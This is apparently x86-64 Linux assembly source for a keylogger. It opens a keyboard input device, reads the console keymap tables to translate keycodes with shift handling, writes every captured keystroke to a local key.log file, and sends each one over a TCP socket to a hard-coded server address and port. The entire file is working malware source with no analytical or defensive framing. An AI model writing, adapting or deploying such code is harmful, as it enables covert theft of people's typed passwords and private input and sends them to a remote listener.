section .text
global  capture_keys

capture_keys:
	call init_socket
	call get_translation_table

	;   create/open the key.log file to store the captured keys
	;   then store file descriptor into fd
	;   and check if all works correctly, if not jmp to error
	mov rax, 2
	mov rdi, file
	mov rsi, 00001102
	mov rdx, 422
	syscall

	mov [fd], rax

	test rax, rax
	js   error

	;   open /dev/input/eventX to read all keys from input
	;   then store the file descriptor to sd
	;   and check if we can open it, if not jmp to error
	mov rax, 2
	mov rdi, source
	xor rsi, rsi
	syscall

	mov [sd], rax

	test rax, rax
	js   error

.read_keys:
	xor rax, rax
	mov rsi, event
	mov rdx, 24
	mov rdi, [sd]
	syscall

	mov byte al, [event + 16]
	cmp ax, 0x0
	je  .read_keys
	cmp ax, 0x4
	je  .read_keys

	mov byte al, [event + 18]
	cmp al, 42
	je  .check_shift

	cmp al, 54
	je  .check_shift

	mov byte al, [event + 20]
	cmp al, 0x0
	je  .read_keys

	mov byte al, [event + 18]
	cmp byte [mode], 1
	je  .upper_key
	jne .lower_key

.check_shift:
	mov byte al, [event + 20]
	cmp al, 0x1
	je  .press_shift
	jne .release_shift

.press_shift:
	mov byte [mode], 1
	jmp .read_keys

.release_shift:
	mov byte [mode], 0
	jmp .read_keys

.upper_key:
	mov byte bl, [upperKeys + eax]
	mov byte [key], bl

	jmp .write_key

.lower_key:
	mov byte bl, [lowerKeys + eax]
	mov byte [key], bl

	jmp .write_key

.write_key:
	mov rax, 1
	mov rdi, [fd]
	mov rsi, key
	mov rdx, 1
	syscall

	mov bl, [key]

	cmp qword [connected], 0x0
	je .send_keys

	jmp .read_keys

.send_keys:	
	mov rax, 1
	mov rdi, [socket]
	mov rsi, key
	mov rdx, 1
	syscall

	jmp .read_keys

get_translation_table:
	call find_tty
	mov r8, rax

	sub rsp, 8

	mov r9, -1
.loop_tables:
  cmp r9, 0x3
  je .end

  pop rax
  xor rax, rax
  push rax

  inc r9
	mov byte [kbentry], r9b

	xor r10, r10
.loop_values:
	inc r10
	mov qword [kbentry+1], r10

	mov rdi, r8
	mov rax, 16
	mov rsi, 0x4B46 ; KDGKBENT	
	mov rdx, kbentry
	syscall

  xor rax, rax
	mov ax, word [kbentry+2]

  cmp ax, word [rsp]
  je .loop_tables

  pop rdi
	push rax

  cmp ax, 0x200
  je .loop_values

  cmp r9, 0x1
  je .shift_table 

.normal_table:
  mov [lowerKeys+r10], rax
  jmp .loop_values

.shift_table:
  mov [upperKeys+r10], rax
  jmp .loop_values

.end:
  add rsp, 8
	ret

find_tty:
	xor r10, r10
	mov r10, 0x30

.loop:
	cmp r10, 0x39
	je .end

	mov rax, 2
	mov rdi, tty
	add [rdi+8], r10
	inc r10
	xor rsi, rsi
	mov rdx, 422
	syscall

	test rax, rax
	js error

	mov r8, rax

	mov rdi, r8
	mov rax, 16
	mov rsi, 0x4B33 ; KDGKBTYPE
	mov rdx, kbmode
	syscall

	test rax, rax
	jnz .loop

	mov rdi, r8
	mov rax, 16
	mov rsi, 0x4B46 ; KDGKBENT	
	mov rdx, kbentry
	syscall

	test rax, rax
	jnz .loop

.end:
	mov rax, r8
  ret


init_socket:
	mov rax, 41
	mov rdi, 0x2
	mov rsi, 0x1
	xor rdx, rdx
	syscall

	mov [socket], rax

	mov rax, 42
	mov rdi, [socket]

	mov word [addr], 0x2
	mov bx, [port]
	mov word [addr + 2], bx
	mov ebx, [serv]
	mov dword [addr + 4], ebx

	mov rsi, addr
	mov rdx, 16
	syscall

	mov [connected], rax
	ret

section .data
  sd dq 0

  file db "./key.log", 0
  fd dq 0

  serv dd 0x0100007f
  port dw 0x3905

  socket dq 0

  mode db 0

	tty db "/dev/tty", 0, 0

section   .bss
	kbentry resb 18
	kbmode resb 1

  lowerKeys resw 255
  upperKeys resw 255

  connected resq 1
  key       resb 1
  addr      resb 16
  event     resb 64
